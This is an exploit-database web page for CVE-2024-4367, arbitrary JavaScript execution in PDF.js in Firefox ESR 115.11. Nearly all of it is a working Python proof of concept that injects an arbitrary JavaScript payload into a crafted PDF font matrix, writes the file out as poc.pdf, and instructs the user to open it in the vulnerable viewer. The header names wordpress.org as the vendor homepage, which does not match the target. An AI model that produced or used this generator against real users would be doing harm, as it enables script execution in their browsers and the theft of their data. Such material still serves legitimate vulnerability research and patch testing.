---
title: Firefox ESR 115.11 PDF.js Arbitrary JavaScript execution
url: https://cxsecurity.com/issue/WLB-2025050026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-10
fetch_date: 2025-10-06T22:26:30.912848
---

# Firefox ESR 115.11 PDF.js Arbitrary JavaScript execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Firefox ESR 115.11 PDF.js Arbitrary JavaScript execution** **2025.05.09**  Credit:  **[Milad Karimi](https://cxsecurity.com/author/Milad%2BKarimi/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-4367](https://cxsecurity.com/cveshow/CVE-2024-4367/ "Click to see CVE-2024-4367")**  CWE: **N/A** | |

# Exploit Title: Firefox ESR 115.11 - Arbitrary JavaScript execution in
PDF.js
# Date: 2025-04-16
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Contact: miladgrayhat@gmail.com
# Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
# MiRROR-H: https://mirror-h.org/search/hacker/49626/
# Vendor Homepage: https://wordpress.org
# Version: = 115.11
# Tested on: Win, Ubuntu
# CVE : CVE-2024-4367
#!/usr/bin/env python3
import sys
def generate\_payload(payload):
backslash\_char = "\\"
fmt\_payload = payload.replace('(', '\\(').replace(')', '\\)')
font\_matrix = f"/FontMatrix [0.1 0 0 0.1 0 (1{backslash\_char});\n" +
f"{fmt\_payload}" + "\n//)]"
return f"""
%PDF-1.4
%DUMMY
8 0 obj
<<
/PatternType 2
/Shading<<
/Function<<
/Domain[0 1]
/C0[0 0 1]
/C1[1 0.6 0]
/N 1
/FunctionType 2
>>
/ShadingType 2
/Coords[46 400 537 400]
/Extend[false false]
/ColorSpace/DeviceRGB
>>
/Type/Pattern
>>
endobj
5 0 obj
<<
/Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 573 0 573 0 341]
/Type/Font
/BaseFont/PAXEKO+SourceSansPro-Bold
/LastChar 102
/Encoding/WinAnsiEncoding
{font\_matrix}
/Subtype/Type1
/FirstChar 65
/FontDescriptor 9 0 R
>>
endobj
2 0 obj
<<
/Kids[3 0 R]
/Type/Pages
/Count 1
>>
endobj
9 0 obj
<<
/Type/FontDescriptor
/ItalicAngle 0
/Ascent 751
/FontBBox[-6 -12 579 713]
/FontName/PAXEKO+SourceSansPro-Bold
/StemV 100
/CapHeight 713
/Flags 32
/FontFile3 10 0 R
/Descent -173
/MissingWidth 250
>>
endobj
6 0 obj
<<
/Length 128
>>
stream
47 379 489 230 re S
/Pattern cs
BT
50 500 Td
117 TL
/F1 150 Tf
/P1 scn
(AbCdEf) Tj
/P2 scn
(AbCdEf) '
ET
endstream
endobj
3 0 obj
<<
/Type/Page
/Resources 4 0 R
/Contents 6 0 R
/Parent 2 0 R
/MediaBox[0 0 595.2756 841.8898]
>>
endobj
10 0 obj
<<
/Length 800
/Subtype/Type2
>>
stream
endstream
endobj
7 0 obj
<<
/PatternType 1
/Matrix[1 0 0 1 50 0]
/Length 58
/TilingType 1
/BBox[0 0 16 16]
/YStep 16
/PaintType 1
/Resources<<
>>
/XStep 16
>>
stream
0.65 g
0 0 16 16 re f
0.15 g
0 0 8 8 re f
8 8 8 8 re f
endstream
endobj
4 0 obj
<<
/Pattern<<
/P1 7 0 R
/P2 8 0 R
>>
/Font<<
/F1 5 0 R
>>
>>
endobj
1 0 obj
<<
/Pages 2 0 R
/Type/Catalog
/OpenAction[3 0 R /Fit]
>>
endobj
xref
0 11
0000000000 65535 f
0000002260 00000 n
0000000522 00000 n
0000000973 00000 n
0000002178 00000 n
0000000266 00000 n
0000000794 00000 n
0000001953 00000 n
0000000015 00000 n
0000000577 00000 n
0000001085 00000 n
trailer
<<
/ID[(DUMMY) (DUMMY)]
/Root 1 0 R
/Size 11
>>
startxref
2333
%%EOF
"""
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) != 2:
print(f"Usage: {sys.argv[0]} <payload>")
sys.exit(1)
print("[+] Created malicious PDF file: poc.pdf")
print("[+] Open the file with the vulnerable application to trigger the
exploit.")
payload = generate\_payload(
sys.argv[1])
with open("poc.pdf", "w") as f:
f.write(payload)
sys.exit(0)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top